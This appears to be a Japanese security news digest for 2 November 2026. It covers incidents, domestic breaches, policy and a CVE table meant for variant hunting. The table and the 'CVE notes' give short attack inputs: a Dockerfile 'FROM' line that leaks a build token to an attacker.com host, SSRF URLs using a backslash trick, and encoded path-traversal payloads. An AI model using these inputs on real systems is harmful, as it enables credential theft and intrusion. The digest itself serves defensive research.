  - 開発元の Ajax Systems はサービスを一時停止し、11/2 朝から段階的に復旧している。国の警報システム自体は影響を受けていない。
- **悪用 / PoC**: 実際の被害。侵入経路は公表されていない。
- **なぜ重要か**: プッシュ配信の基盤を奪われると、正規のアプリへの信頼がそのまま偽情報の拡散に使われる。モバイルの診断では、FCM / APNs のサーバーキーの漏えいと、配信 API の認可を確認する項目の重要性を示す。
- 出典: [The Record](https://therecord.media/ukraine-hackers-russia-alert-system)

### [2026-11-02] ロシア連邦統計局 (Rosstat) にワイパー攻撃。ベラルーシの Cyber Partisans とウクライナ系の Silent Crow が「半年潜伏し、約 2.5 万台を破壊した」と主張
- **何が起きたか**:
  - 両グループの主張によると、約 6 か月前に侵入して 4 か月かけて横に広がり、ドメインコントローラー、仮想化基盤、管理ツールを掌握したうえで、10/31 夜に一斉に破壊した。
  - Rosstat は攻撃を受けたことは認めたが、「保護対象の情報が流出した証拠はない」と反論している。
- **悪用 / PoC**: 規模は主張ベース。攻撃を受けた事実は確認されている。
- **なぜ重要か**: 長く潜伏し、AD と仮想化基盤を掌握してから破壊する、国家機関への典型的な破壊型の攻撃。被害の規模は当事者の主張と当局の否定が食い違っているので、事実と主張を分けて扱う必要がある。
- 出典: [The Record](https://therecord.media/hackers-ukraine-belarus-russia)

### [2026-11-02] イラン系「DarkBlinders」、イスラエルの要人とクルド自治政府のクラウド環境を侵害。GitHub を C2 に使う
- **何が起きたか**:
  - Dream Research Labs によると、8〜10 月に侵害した。
  - スピアフィッシングで改ざんしたユーティリティを配り、DLL サイドローディングで SHELBYLOADER を読み込ませて、GitHub を C2 に使う SHELBYC2 を動かす。
  - Elastic は REF8685、Palo Alto は CL-STA-1178 として追跡しており、偽の採用課題 (コーディングテスト) を初期侵入に使った例もある。
- **悪用 / PoC**: 実際の侵害。
- **なぜ重要か**: 「偽のコーディング課題」と「GitHub を C2 にする手口」は、開発者を狙う初期侵入の典型。EDR / プロキシの検知シナリオや、社内訓練の題材になる。
- 出典: [The Hacker News](https://thehackernews.com/2026/11/darkblinders-compromises-israeli-target.html)

### [2026-11-02] 米国で教育・大学の侵害: フロリダ州の学資援助サイトで 490 万人分。Michigan State は、新興の BYOD ランサムが 130 万人分を盗んだと主張
- **何が起きたか**:
  - フロリダ州教育省は 10/19 に、学資援助サイトへの侵入を検知した。対象は約 490 万人で、SSN、生年月日、住所が含まれる。
  - Michigan State については、BYOD が 11/1 夜にリークサイトに掲載し、130 万人分を盗んだと主張した。大学は「中央の AD が侵害された証拠はない」としている。
- **悪用 / PoC**: フロリダは実際の侵害。Michigan State は主張ベース。
- **なぜ重要か**: BYOD は 9 月に現れたグループで、病院、Trump Mobile、大学と、標的を急速に広げている。
- 出典: [SecurityWeek](https://www.securityweek.com/florida-student-aid-website-hack-puts-data-of-4-9-million-people-at-risk/) / [The Record](https://therecord.media/michigan-state-university-byod-gang-cyber-incident)

### [2026-11-02] Google Cloud VRP に、最高 25 万ドルの「root-in-cloud」枠を新設。任意のテナントで `roles/owner` を取るか、Borg で RCE を成立させるのが対象
- **何が起きたか**:
  - 既存の権限、漏れた認証情報、ソーシャルエンジニアリングに頼らずに、任意の GCP 組織で `roles/owner` を取ることが報奨の対象になった。
  - Borg (Google の本番基盤) でコードが実行できた時点で、探索を止めなければならない。その先の権限昇格や横展開は失格になる。
- **悪用 / PoC**: 該当しない (制度の変更)。
- **なぜ重要か**: クラウドのテナント分離を破る研究に、高額の報奨がはっきり付いた。どこで止めるかのルールは、研究者の行動規範として読んでおく価値がある。
- 出典: [SecurityWeek](https://www.securityweek.com/google-introduces-250000-root-in-cloud-bug-bounty-reward/)

### [2026-11-02] 米国のコミュニティ銀行向け SaaS「Sageworks」(Abrigo、利用 2,400 社超) が「不審な活動」で停止 (短信)
- **何が起きたか**: Abrigo は 10/30 にポータルと API を止め、11/2 時点で大部分を復旧した。侵害かどうかは公表していない。
- **なぜ重要か**: 金融機関が使う SaaS の第三者リスクの例。国内の読者への直接の影響は小さい。
- 出典: [BleepingComputer](https://www.bleepingcomputer.com/news/security/fintech-platform-sageworks-taken-offline-after-suspected-cyberattack/)

> CISA KEV: 10/31〜11/2 に追加はない (フィードの最終更新は 10/30 17:02 UTC)。Ivanti Connect Secure の CVE-2026-111357 は、11/2 が連邦機関の対応期限だった。

## 新規 CVE / Advisory (バリアントハント起点候補)

> 採用基準: 公開日 2026-11-01 以降 / 修正コミット公開済み or バグクラスが言語化可能なものを優先

| CVE / GHSA | 製品 (脆弱バージョン) | CWE / CVSS | バグクラス概要 (条件+sink+結果) | 修正コミット | 優先シグナル |
|-----------|---------------------|-----------|---------------------------------|------------|------------|
| CVE-2026-120213 / GHSA-h3vp-4jfr-v364 | npm `@fastify/http-proxy` 9.0.0〜11.6.5 (修正 11.6.6) | CWE-22, CWE-436 / 9.1 | パラメーター付きの `rewritePrefix` が、デコード済みの `%2f` `%23` `%3f` を再エンコードせずに上流のパスへ連結する → プレフィックスや接尾辞を外して上流の任意のパスへ (SSRF / 認可回避) | [diff](https://github.com/fastify/fastify-http-proxy/commit/25c0d117da72872d68e626cbeb22aab402d6cc0d) | 未認証 / PoC は advisory にあり |
| CVE-2026-117518 / GHSA-vp2r-3vgv-32g9 | npm `@fastify/reply-from` ≤12.8.0 (修正 12.8.1) | CWE-22 / 8.2 | `buildURL()` が `/../` だけを拒否し、WHATWG URL が `\` と `%5c` を `/` に正規化する → `%5c..%5c` で上流のプレフィックスの外へ | [diff (推定)](https://github.com/fastify/fastify-reply-from/commit/b461e9cbeeb623b386d5c7a14a6b412e9a15657e) | 未認証 / パターンは advisory にあり |
| CVE-2026-105769 / GHSA-5q7h-w9jf-cx97 | kaniko (chainguard-dev fork) <1.25.20。原因の `docker-credential-acr-env` には修正版がない | CWE-346, CWE-522 / 9.3 | ACR の資格情報ヘルパーが、アンカーのない正規表現で `.azurecr.io` を含むかだけを判定する → `FROM x.azurecr.io.attacker.com/img` で、ビルド環境の Entra ID トークンを攻撃者のホストへ POST する | [diff](https://github.com/chainguard-forks/kaniko/commit/08de01fe7fffaeb6bc030efa9eae723ea2dd4405) | Dockerfile 1 行で成立 / 上流のヘルパーは修正されない |
| CVE-2026-120459 | PyPI `python-jose` ≤3.5.0 (修正なし) | CWE-347 / v4 9.1 | `HMACKey` が長さ 0 の secret を拒否しない → 環境変数の未設定や JWK の `k:""` で検証鍵が空になる → 空の鍵で署名した任意のクレームが `jwt.decode` を通る | [issue #398](https://github.com/mpdavis/python-jose/issues/398) (commit 不明) | PoC 断片が issue にある / 修正なし |
| CVE-2026-94290 / GHSA-qfmw-gw96-ffcr | SUSE Rancher Fleet 0.13〜0.16 系 (修正 0.16.3 など) | CWE-250 / 9.1 | Fleet の Cluster オブジェクトが参照できる kubeconfig Secret を制限していない → 一般ユーザーの名前空間から管理クラスタの管理者 kubeconfig を参照し、任意のワークロードを動かす | [advisory](https://github.com/rancher/fleet/security/advisories/GHSA-qfmw-gw96-ffcr) (commit 不明) | PoC なし |
| CVE-2026-88811 / GHSA-x82x-2qj6-5rm2 | Rancher 2.11〜2.15 系 (修正 2.15.3 / 2.14.7 など) | CWE-201 / 9.1 | `/meta/proxy` が、受け取った `Authorization` や `Cookie` を外部のクラウド API へそのまま転送する → Rancher のセッションや API トークンが第三者に渡る | [PR #58223](https://github.com/rancher/rancher/pull/58223) (commit 不明) | GHSA は 10/29、CVE は 11/2 |
| CVE-2026-88809 / GHSA-f9gf-wh3x-jx3v | Rancher 同上 | CWE-918 / 7.6 | `/meta/proxy` の allowlist 判定が、ログを出すだけで転送を止めない → allowlist にない宛先への SSRF | [advisory](https://github.com/rancher/rancher/security/advisories/GHSA-f9gf-wh3x-jx3v) (commit 不明) | 「判定するが強制しない」型 |
| CVE-2026-81938 | Grafana Mimir <3.1.7 / <3.2.2、GEM <2.17.20 | CWE-22 / 7.7 | テナントがアップロードする Alertmanager 設定の「ローカルファイル参照の拒否」が、`http_headers.*.files` と `basic_auth.username_file` を見落とす → ホスト上の任意のファイルを通知の HTTP ヘッダーに入れて外部へ送る | [NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-81938) (commit 不明) | テナント間でファイルを持ち出せる |
| CVE-2026-120630 | crewai-tools `ScrapeWebsiteTool` <1.15.17 | 未付与 | SSRF のガード (`urlparse`) と HTTP クライアント (urllib3) で `\@` の解釈が違う → `http://127.0.0.1:8080\@1.1.1.1/` が公開アドレスとして許可され、内部に接続する | [PR #6981](https://github.com/crewAIInc/crewAI/pull/6981) (commit 不明) | PoC は研究ブログにある |
| CVE-2026-104080 / 77876 / 73696 ほか | Control Web Panel <1.30 (CWE の各件で修正版が異なる) | CWE-78 / 8.6〜9.3 | ループバック API `/valid_token/` が認証なしに `user` パラメーターを `shell_exec()` に渡す → root でコマンドが実行される。ユーザーパネルのリダイレクト後の処理継続による認証回避 (73696) と組み合わせられる | [VulnCheck](https://www.vulncheck.com/advisories/control-web-panel-cwp-os-command-injection-via-valid-token) (commit 不明、クローズドソース) | 過去に KEV 入り (CVE-2022-44877) |
| CVE-2026-120062 ほか 11 件 | psqlODBC <18.00.0006 | CWE-89 / 7.5 ほか | `SQLSpecialColumns` だけが、テーブル名とスキーマ名をエスケープせずにカタログクエリへ連結する → SQLi。ほかに、サーバー応答の長さを信用したことによるヒープ / スタックのオーバーフロー (悪意ある DB サーバーからクライアントを攻撃できる) | [GHSA-gg8f-fx3w-rj33](https://github.com/postgresql-interfaces/psqlodbc/security/advisories/GHSA-gg8f-fx3w-rj33) (commit 不明) | PoC なし |
| CVE-2026-120438 | QuickJS-NG <0.16.0 | CWE-190 / – | 32 ビット環境で、Proxy の `ownKeys` が返す配列の長さの計算で整数オーバーフロー → ヒープオーバーフロー | [diff](https://github.com/quickjs-ng/quickjs/commit/252209d99cf112568160548bdcaa98d95e0d0068) | 組み込み JS エンジン |

**短信 (11/1〜2 公開)**:
- **C-Kermit 11.0.514 以前** (GHSA-c5px-7h4c-gj8p、CVE は申請中): Telnet の NEW-ENVIRON と FTP の ADAT の応答を解析するときにオーバーフローがあり、Kermit サーバーの REMOTE WHO にはシェル注入がある (1985 年からある欠陥)。11.1.515 で修正。[oss-security](https://www.openwall.com/lists/oss-security/2026/11/02/1)
- **Apache Wicket** 8.20.0 / 9.25.0 / 10.12.0 で 19 件を修正。WebSocket や ResourceLink などから認可戦略を回避する経路が多い。CVE-2026-82840 はセッション固定の問題。8.x と 9.x はこれで EOL になる。[oss-security](https://www.openwall.com/lists/oss-security/2026/11/01/4)
- **Krill** CVE-2026-109140 (8.4): セッショントークンの暗号化に使う nonce のカウンタが、再起動のたびに 0 に戻る。その結果、鍵と nonce の組が再利用される (CWE-323)。[NLnet Labs](https://www.nlnetlabs.nl/downloads/krill/CVE-2026-109140.txt)
- **ManageEngine Password Manager Pro 13236 未満 / PAM360 8601 未満** CVE-2026-18199 (8.8): 認証後の RCE。[ManageEngine](https://www.manageengine.com/products/passwordmanagerpro/advisory/cve-2026-18199.html)
- **OpenKruise** CVE-2026-120656: kruise-manager の pprof が、認証なしで `0.0.0.0:8090` に公開されていた。v1.9.2 で修正 (PR openkruise/kruise#2613)。

**今日の CVE 所感**:
- **検査用と送信用で、URL のパーサーが食い違うものが 3 件**: reply-from (`\` の正規化)、http-proxy (デコード済みのパラメーターの差し込み)、CrewAI (`urlparse` と urllib3 の差)。WHATWG URL の `\` の扱いは仕様の側の挙動で、言語をまたいで同じことが起きる。プロキシ、SSRF のガード、リダイレクトの検証など、「検証してから別のライブラリで送る」実装はすべて同じペイロード (`%5c`、`\`、`%2f`、`%23`、`%3f`、`\@`) で確認できる。
- **ホストの一致判定が甘い**: kaniko の ACR ヘルパーのように、資格情報を自動で付けるクライアントで、後方一致や部分一致で判定している箇所は典型的な狙い目。Docker の credential helper、クラウド SDK、git の credential helper も同じ観点で grep する価値がある。
- **判定の漏れ・判定しても止めない・既定値で通る**: Mimir (ファイル参照フィールドの列挙漏れ)、Rancher 88809 (allowlist を判定してもログだけ)、python-jose (空の鍵) は、どれも「チェックはあるが効いていない」型。マルチテナントの設定アップロード機能と JWT の検証では、境界値 (空、未設定、別名のフィールド) を必ず試したい。
- 診断で優先する製品: Fastify 系の BFF、Rancher、Fleet の管理クラスタ、Langflow (前述)、CWP (共用ホスティング)。

## 日本国内のセキュリティ動向

> 11/1 (日)・11/3 (文化の日) を挟むため、一次情報はほぼ 11/2 (月) の公表に集中した。11/2 は大規模な個人情報漏えいの公表が相次ぎ、共同通信は「不正アクセスで個人情報流出続く」と報じた。

### 国内インシデント・事故

#### [2026-11-02] [続報] アララ「アララ メッセージ」第 2 報: 流出したメールアドレスは約 301 万件から約 7,700 万件に増え、サーバー 97 台・最大約 380 社に拡大
- **前回 (10/28〜29 の初報) から変わった点**:
  - 攻撃者は 10/28〜31 に、本サービスのサーバーを踏み台にして、契約企業の環境のサーバー 97 台 (推計で最大約 380 社) に侵入し、DB を持ち出した。
  - 持ち出されたメールアドレスは約 7,700 万件 (精査中)。契約企業によっては、氏名、性別、生年月日、電話番号、会員番号、住所も含まれる。
  - 初報の共用環境の件数は、重複を除いて 3,386,187 件 (61 社) に訂正した。この環境では、10/27〜28 に管理画面へ不正ログインされ、データ出力の機能が悪用されていた。
  - 10/28〜30 には 2 つの環境が不正に使われ、カード会社を装う不審メールが最大約 713 万通送られた (送信元は `news@arara.com`、件名は「利用内容確認のご依頼」など)。
  - 原因は「Web サーバーの脆弱性とシステム環境の問題」としている。10/31 に全サービスを止め、再開は未定。
  - 同じ日に、大阪ガスが委託先経由でメールアドレス約 3.4 万件の漏えいを公表した。共同通信は北陸電力の分も含まれると報じている。
- **なぜ重要か**: ユミルリンク Cuenote FC、ラクスライトクラウドのブラストメールに続き、メール配信 SaaS では 3 件目の大規模侵害で、規模は最大。1 つの環境を足がかりに、顧客のテナントへ横に広がった。マルチテナントの分離、管理画面のエクスポート機能、テナント間で使い回される認証情報は、SaaS 診断の重点項目になる。正規の配信基盤からフィッシングが送られる二次被害にも注意が要る。
- 出典: [アララ 第 2 報 (PDF)](https://www.arara.com/dcms_media/other/arara_20261102__.pdf) / [INTERNET Watch](https://internet.watch.impress.co.jp/docs/news/2153174.html)

#### [2026-11-02] ノジマ「ノジマオンライン」と中古スマホ買取サイトの会員管理システムに不正アクセス。約 700 万件が漏えい
- **何が起きたか**:
  - 11/1 (日) に不正アクセスを検知し、同じ日のうちに外部への漏えいを確認した。対象は約 700 万件 (退会者を除く)。
  - 漏えいした項目は、氏名、生年月日、性別、住所、電話番号、ログイン ID、暗号化されたパスワード、メールアドレス。決済情報は持たない方式のため、カード情報は含まれない。
  - 2 つのサイトを休止し、警察に相談した。侵入経路は公表していない。
- **なぜ重要か**: パスワードの保存方式は「暗号化」と書かれているだけで、ハッシュか可逆暗号かが分からない。可逆暗号で鍵も一緒に漏れていれば、影響は大きい。他のサービスへのリスト型攻撃に警戒が要る。
- 出典: [ノジマ (PDF)](https://www.nojima.co.jp/wp-content/uploads/2026/11/fa47750556e505f2ddb83dc080a6420f.pdf)

#### [2026-11-02] アイスタイル「@cosme」、共通 ID の会員約 300 万人分が漏えい
- **何が起きたか**:
  - 漏えいした項目は、氏名、住所、電話番号、メールアドレス、ユーザー ID、性別、生年月日、ニックネーム、肌質、髪質。パスワードとカード情報は含まれないとしている。
  - 漏えいを確認したのは 10/28。手口は外部の専門会社が調査中。対象者への連絡は 11/6 までに、cosme.net のドメインから送る。
- **なぜ重要か**: 肌質や髪質などの属性情報が、なりすましメールの説得力を高める。退会者も対象に含まれており、退会後もデータを持ち続ける設計が問われる。
- 出典: [アイスタイル](https://www.istyle.co.jp/news/info/2026/11/1102.html) / [ITmedia](https://www.itmedia.co.jp/news/article/2611/02/2000002795/)

#### [2026-11-02] サントリー HD とサントリービバレッジ&フード、業務で使う外部クラウドに不正アクセス。約 10 万人分が漏えい
- **何が起きたか**:
  - ファイル共有、メール、チャットに使う外部のクラウドサービスから、ファイルがダウンロードされた。
  - 経緯: 10/28 に異常を検知し、10/29 に個人情報を含むファイルを確認、11/2 に個人情報保護委員会へ報告した。
  - 対象は、グループと取引先の従業員の氏名とメールアドレス、2026 年新卒採用の応募者の連絡先など。
- **なぜ重要か**: 侵入されたのはオンプレミスではなく、SaaS 上のファイル共有。SaaS テナントの条件付きアクセス、トークンの管理、外部共有の設定が見直しの対象になる。報道では Microsoft のクラウドとされるが、一次情報では確認できていない。
- 出典: [朝日新聞 (Yahoo!)](https://news.yahoo.co.jp/articles/a145062acdefd5f16e233f097f9acb347e373baf) / [NHK](https://news.web.nhk/newsweb/na/nd-20261102de69622)

#### [2026-11-02] セガ フェイブ、アーケード向けネットワーク「ALL.Net」と「Aime」の関連サーバーに不正アクセス。11/1 15 時から関連サービスを停止
- **何が起きたか**:
  - 初期の調査では、顧客や取引先の情報の流出は確認されていない。決済情報は、これらのサーバーに置いていない。
  - オンラインプレイ、Aime、PrizeON、SEGA ID の新規登録などが止まっている。バンダイナムコエクスペリエンスの ALL.Net 対応タイトルにも影響が出た。
- **なぜ重要か**: 全国のゲームセンターの筐体をつなぐ認証・課金の基盤が止まり、他社のタイトルにも波及した。可用性への影響が大きい事例。
- 出典: [セガ フェイブ](https://www.segafave.co.jp/news/261102_1/)

#### [2026-11-02] 丸井グループ、デジタル社債の管理を委託した会社のサーバーに不正アクセス。最大 9,086 人分が漏えい
- **何が起きたか**: 社債を買うためにアカウントを作った顧客の情報が、最大 9,086 人分漏えいした。うち 54 人分は、銀行の口座番号を含む可能性がある (共同通信)。委託先の名前と侵入経路は、報道の時点では不明。
- **なぜ重要か**: 前週の NTT データの社債プラットフォームの件 (楽天証券、カゴメ、JR 西日本、野村證券に波及) と同じく、デジタル証券 (STO) の基盤を担う委託先からの漏えい。同じ委託先かどうかは確認されていない。
- 出典: [NHK](https://news.web.nhk/newsweb/na/nd-20261102de69819) / [共同通信 (OANDA 転載)](https://www.oanda.jp/lab-education/market_news/kn_2026110201001596/)

#### [2026-11-02] [続報] GMO ペイメントゲートウェイ、ライフカード向けのイシュイング支援機能で不正利用。69 件
- **何が起きたか**: 10/30 に、ライフカード向けの個別の機能 (他の顧客とは別のシステム基盤) で、不正なユーザーによる操作があった。氏名や住所などの一部が 63 件、V プリカの番号・セキュリティコード・有効期限・名義が 3 件、番号の一部が 3 件、窃取された可能性がある。
- **なぜ重要か**: 前日号で扱った「ライフカード V プリカの委託先への不正アクセス」の委託先が、GMO-PG だと分かった形。GMO グループでは一連の事案が続いている。
- 出典: [GMO ペイメントゲートウェイ](https://www.gmo-pg.com/news/news/info/2026/1102.html)

#### [2026-11-02] [続報] GMO インターネットグループの熊谷代表が初めて会見。社内のイエラエからの指摘を「生かせなかった」と認める
- **前回 (11/1 の「北朝鮮系の可能性」の報道) から変わった点**: 熊谷代表は、「お名前.com デスクトップクラウド」のシステムにセキュリティ上の問題があったことを「事実」と認めた。グループ会社の GMO サイバーセキュリティ by イエラエの専門家から指摘を受けていながら、生かせなかったことも認めた。SNS への投稿についても謝罪した。
- **なぜ重要か**: 診断の指摘が是正につながらなかった、典型的なガバナンスの失敗。診断の報告書を出して終わりにせず、是正までどう追跡させるかが、業界の論点として改めて問われる。
- 出典: [ITmedia](https://www.itmedia.co.jp/news/article/2611/02/2000002806/)

### 国内の注意喚起・ガイドライン・政策

#### [2026-11-02] IPA、「情報セキュリティ安心相談窓口」で、個人情報が漏えいした人からの相談を受け付ける体制を強化
- **何が起きたか**:
  - Web システムの脆弱性の悪用やサプライチェーン経由の侵害で、漏えいの公表が相次いでいることを受けた措置。
  - 漏えいへの不安、二次被害の防ぎ方、フィッシングについて、個人からの相談を受ける。窓口は電話 03-5978-7509 (平日 10〜17 時) と anshin@ipa.go.jp。消費生活センターとの連携も強める。
  - 関連として、官邸の「個人情報流出の被害に遭われた方へ」(10/30) と、サイバーセキュリティに関する関係閣僚会議 (10/26) を挙げている。
- **なぜ重要か**: 漏えいの多さに、国が被害者向けの窓口を整える段階になった。組織が侵害を公表するときに、案内先として示せる。
- 出典: [IPA](https://www.ipa.go.jp/pressrelease/2026/press20261102.html)

#### [2026-11-02] 警察庁、第 1 回「日米セキュリティ・法執行機関対話 (SLED)」を開催。デジタル・フォレンジックなどを議論
- **何が起きたか**: 警察庁 (楠長官) と駐日米国大使館 (グラス大使) が東京で開いた。米国側からは FBI、DHS、CBP なども参加した。議題はデジタル・フォレンジック、先端技術の導入、警護のインテリジェンスで、継続して開くことで合意した。
- **なぜ重要か**: 北朝鮮系による暗号資産の窃取や、GMO の事案 (北朝鮮系の疑い) が続くなか、日米の捜査協力の枠組みが加わった。ただし、サイバー事案に絞った成果は文書に書かれていない。
- 出典: [警察庁 (PDF)](https://www.npa.go.jp/news/release/2026/20261102sled-pressrelease.pdf)

#### [2026-11-02] (小) 個人情報保護委員会、第 3 回「個人情報保護政策に関する懇談会」の議事録を掲載
- 3 年ごとの見直しの議論に関わる資料で、新しい規制や処分の発表ではない。
- 出典: [個人情報保護委員会](https://www.ppc.go.jp/)

> 期間中、JPCERT/CC の新しい注意喚起はなかった。IPA の PHP2Shell の注意喚起 (alert20261022、既出) は 11/2 に更新され、「VPN 機器やセキュリティアプライアンスの Web インターフェースなど、PHP を使う製品も影響を受ける可能性がある」と追記された。アプライアンスを診断する際は、この観点を加えておきたい。NISC (国家サイバー統括室)、総務省、経産省、金融庁からは、期間中にセキュリティ関連の発表はなかった。

### 国内製品の脆弱性 (JVN)

> JVN で 11/1〜11/3 に新しく公開されたのは 1 件だけ。JVN iPedia と MyJVN (JVNDB RSS を含む) は 10/30 からサービスを停止しており、11 月中に再開する見込みと告知されている。古い案件は混ぜていない。

| 公開日 | 識別子 (JVN / CVE) | 製品・ベンダー | 概要 (1行) | CVSS / 影響 | リンク |
|--------|--------------------|---------------|-----------|-------------|--------|
| 2026-11-02 | JVN#23328936 / CVE-2026-109836 | ALCPU Core Temp v1.21 未満 (カーネルドライバ) | IOCTL インターフェースのアクセス制御が不十分 (CWE-782) | v4 8.4 / v3 6.7 (AV:L/PR:H)。物理メモリを読み書きされる。v1.21 で修正。報告者は柳川珠樹氏 | [JVN](https://jvn.jp/jp/JVN23328936/) |

- **評価**: 悪用には管理者権限が要るが、署名済みの脆弱なドライバとして、BYOVD (EDR を無効化する手口) に使われ得る種類。Microsoft の脆弱なドライバのブロックリストや LOLDrivers に載るかを追う価値がある。

### 国内コミュニティ・研究・イベント

#### [2026-11-02] Zenn「人の手による修正はもう間に合わない」: 2026 年 9〜10 月に相次いだ漏えいを、公表されているデータで読み解く
- **何が起きたか**:
  - 著者が個人の見解として、公表データから推計した。使ったのは、PPC の漏えい等の報告 (10 月だけで 10/16 までに 830 件)、NVD の CVE (10/31 までに 89,837 件、通年の見込みは約 12.2 万件)、CISA KEV (10/30 までに 282 件)。
  - 2026 年 7 月以降、侵入の入口が VPN などの境界から、Web・API、アカウント、委託先の SaaS に移ったと主張している。
- **なぜ重要か**: 国内の漏えいの急増を数字で見渡せる、数少ない記事。ただし将来の予測は著者による推計。
- 出典: [Zenn](https://zenn.dev/jirtosterone/articles/24a20093308546)

#### [2026-11-02] Internet Week 2026 (第 30 回)、「AI 時代の脆弱性対応」のプログラムについて企画者インタビュー (ScanNetSecurity)
- **何が起きたか**: 会期は、オンラインが 11/19〜24、会場 (両国 KFC Hall) が 11/25〜27。ICT-ISAC と ISOG-J の企画者が、AI で脆弱性の発見から悪用までの時間が縮むことを前提に、対応プロセスを見直すべきだと語っている。
- **なぜ重要か**: 本号の Trail of Bits や Linux 7.4 の話題と同じく、「AI で発見が加速し、修正と運用が追いつかない」ことが国内でも議論の中心になっている。
- 出典: [ScanNetSecurity](https://scan.netsecurity.ne.jp/article/2026/11/02/56650.html)

> 参考: CODE BLUE 2026 は、トレーニングが 11/11〜15、カンファレンスが 11/17〜18 (公式サイトで会期を確認。新しい告知ではないため、参考として記載)。Claude Code のサンドボックスを検証した Zenn の記事は、「AI セキュリティ」に掲載した。

---

<details><summary>取得状況 (デバッグ用)</summary>

- 巡回ソース数: 約 113 (AI 47 / セキュリティ・CVE 33 / 国内 33。重複を含む)
- 採用件数: AI技術=11 / AIセキュリティ=7 / セキュリティ=13 (+ KEV の状況注記) / CVE=12 行 (+ 短信 5) / 国内インシデント=8 / 国内政策=3 / JVN=1 / 国内コミュニティ=2 (+ 参考 1)
- 除外理由内訳: 古すぎ=約 44 / 重複=約 33 / 日付不明・一次未確認=5
  - 主な古すぎ:
    - Unit 42 の SysGoRAT / CL-UNK-1211 (一次は 10/15。THN が 11/02 に改めて報じただけ)
    - PortSwigger "Scalable Vector Grief"、Project Zero、ZDI PeopleSoft (いずれも 10/27)
    - OpenAI の GPT-Rosalind-6 System Card (10/30)
    - ScanNetSecurity 11/2 付の国内記事 12 件 (一次の公表は 10/19〜27)
    - 外務省、アイリスプラザ、グッドスマイルカンパニーの続報 (10/29〜30)
  - 主な重複:
    - Ivanti CVE-2026-111357 / 118527 の続報 (新しい事実なし)
    - Binance の FBI による帰属
    - Cursor の改ざん版 Claude Code 拡張
    - VOLTA、Chainalysis、Revolve
    - Gitea の一連の CVE、Beta9、LXD CVE-2026-112816、libexpat 2.10.0
    - ChatGPT の Chat/Work 統合、DeepSeek Super-agent、robots.txt の AI 学習シグナル
    - JVNVU#90141693 / 93251594 / 95856220
  - 日付不明・一次未確認: LongCat-2.5、ネットドリーマーズ、クラブツーリズム 432 万件、SmartNews の追加事案、Anthropic の日本での公募額
- 取得失敗ソース:
  - api.github.com/advisories、github.com/advisories (curl / gh / MCP): リポジトリ単位のスコープ制限で 403。NVD API で一覧を取り、GHSA の個別ページを WebFetch で読んで代替した。
  - cisa.gov の advisories フィード: 403。KEV の JSON で代替した。
  - openai.com の記事ページ: 403。RSS の要約と The Verge で代替した。
  - The Verge、Business Insider: WebFetch で取得できなかった。RSS と他メディアで代替した。
  - Dark Reading の一部記事: 403。不採用にした。
  - HiddenLayer の feed、slcyber.io/feed、projectdiscovery.io/blog/rss.xml: 404。
  - Lakera、DeepMind、MSRC、Google Cloud Threat Intel の RSS: パースエラー。SpecterOps と Mandiant のフィードは item が 0 件。
  - grafana.com の CVE-2026-81938 advisory: 404。NVD の記述で代替した。
  - OSV: 新しい GHSA の多くが未収録。
  - JVNDB RSS / JVN iPedia: サービス停止中 (11 月中に再開の見込み)。
  - suntory.co.jp: Akamai が 403 を返す。朝日新聞と NHK で代替した。
  - paycloud-hd.co.jp: 502。アララの一次 PDF で代替した。
  - Mandiant の LLMjacking の一次レポート: URL を特定できなかった。The Register で代替した。
  - EPSS: 新しい CVE の多くはまだ算出されていない。

</details>
